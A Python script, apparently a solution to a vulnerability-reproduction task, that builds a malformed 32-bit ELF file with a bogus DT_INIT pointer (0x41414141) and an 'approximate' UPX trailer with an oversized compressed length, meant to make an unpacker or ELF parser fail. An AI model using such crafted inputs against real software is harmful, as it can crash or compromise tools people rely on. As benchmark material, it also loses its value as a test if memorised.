import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        data = bytearray(512)
        # ELF header
        data[0:4] = b'\x7fELF'
        data[4] = 1  # EI_CLASS
        data[5] = 1  # EI_DATA
        data[6] = 1  # EI_VERSION
        data[7] = 0  # EI_OSABI
        for i in range(8, 16):
            data[i] = 0  # EI_PAD
        struct.pack_into('<H', data, 16, 3)  # e_type ET_DYN
        struct.pack_into('<H', data, 18, 3)  # e_machine EM_386
        struct.pack_into('<I', data, 20, 1)  # e_version
        struct.pack_into('<I', data, 24, 0)  # e_entry
        struct.pack_into('<I', data, 28, 52)  # e_phoff
        struct.pack_into('<I', data, 32, 0)  # e_shoff
        struct.pack_into('<I', data, 36, 0)  # e_flags
        struct.pack_into('<H', data, 40, 52)  # e_ehsize
        struct.pack_into('<H', data, 42, 32)  # e_phentsize
        struct.pack_into('<H', data, 44, 3)  # e_phnum
        struct.pack_into('<H', data, 46, 0)  # e_shentsize
        struct.pack_into('<H', data, 48, 0)  # e_shnum
        struct.pack_into('<H', data, 50, 0)  # e_shstrndx
        # Program headers start at 52
        phoff = 52
        # PT_LOAD text
        struct.pack_into('<I', data, phoff + 0, 1)  # p_type
        struct.pack_into('<I', data, phoff + 4, 0)  # p_offset
        struct.pack_into('<I', data, phoff + 8, 0x400000)  # p_vaddr
        struct.pack_into('<I', data, phoff + 12, 0x400000)  # p_paddr
        struct.pack_into('<I', data, phoff + 16, 100)  # p_filesz small
        struct.pack_into('<I', data, phoff + 20, 0x1000)  # p_memsz large
        struct.pack_into('<I', data, phoff + 24, 5)  # p_flags RX
        struct.pack_into('<I', data, phoff + 28, 0x1000)  # p_align
        phoff += 32
        # PT_LOAD data
        struct.pack_into('<I', data, phoff + 0, 1)  # p_type
        struct.pack_into('<I', data, phoff + 4, 148)  # p_offset
        struct.pack_into('<I', data, phoff + 8, 0x401000)  # p_vaddr
        struct.pack_into('<I', data, phoff + 12, 0x401000)  # p_paddr
        struct.pack_into('<I', data, phoff + 16, 364)  # p_filesz
        struct.pack_into('<I', data, phoff + 20, 0x2000)  # p_memsz large
        struct.pack_into('<I', data, phoff + 24, 6)  # p_flags RW
        struct.pack_into('<I', data, phoff + 28, 0x1000)  # p_align
        phoff += 32
        # PT_DYNAMIC
        dyn_off = 148
        struct.pack_into('<I', data, phoff + 0, 2)  # p_type
        struct.pack_into('<I', data, phoff + 4, dyn_off)  # p_offset
        struct.pack_into('<I', data, phoff + 8, 0x401000)  # p_vaddr
        struct.pack_into('<I', data, phoff + 12, 0x401000)  # p_paddr
        struct.pack_into('<I', data, phoff + 16, 64)  # p_filesz
        struct.pack_into('<I', data, phoff + 20, 64)  # p_memsz
        struct.pack_into('<I', data, phoff + 24, 4)  # p_flags R
        struct.pack_into('<I', data, phoff + 28, 8)  # p_align
        # Dynamic section at 148
        d_off = 148
        struct.pack_into('<I', data, d_off, 0)  # DT_NULL
        struct.pack_into('<I', data, d_off + 4, 0)
        d_off += 8
        struct.pack_into('<I', data, d_off, 12)  # DT_INIT
        struct.pack_into('<I', data, d_off + 4, 0x41414141)  # invalid large ptr
        d_off += 8
        struct.pack_into('<I', data, d_off, 5)  # DT_STRTAB
        struct.pack_into('<I', data, d_off + 4, 0x401100)  # strtab vaddr
        d_off += 8
        struct.pack_into('<I', data, d_off, 6)  # DT_SYMTAB
        struct.pack_into('<I', data, d_off + 4, 0x401200)
        d_off += 8
        struct.pack_into('<I', data, d_off, 0)  # DT_NULL
        struct.pack_into('<I', data, d_off + 4, 0)
        # Approximate UPX trailer at end
        trailer_off = 500
        data[trailer_off] = 0x52  # id
        data[trailer_off + 1] = 0x03  # cmpr_id
        data[trailer_off + 2] = 0x0b  # fmt_id ELF
        data[trailer_off + 3] = 0x14  # method
        data[trailer_off + 4] = 0  # filter
        data[trailer_off + 5] = 0
        data[trailer_off + 6] = 0
        data[trailer_off + 7] = 0
        struct.pack_into('<I', data, trailer_off + 8, 512)  # u_len
        struct.pack_into('<I', data, trailer_off + 12, 0x10000)  # c_len large
        struct.pack_into('<I', data, trailer_off + 16, 0)  # adc/crc
        return bytes(data)
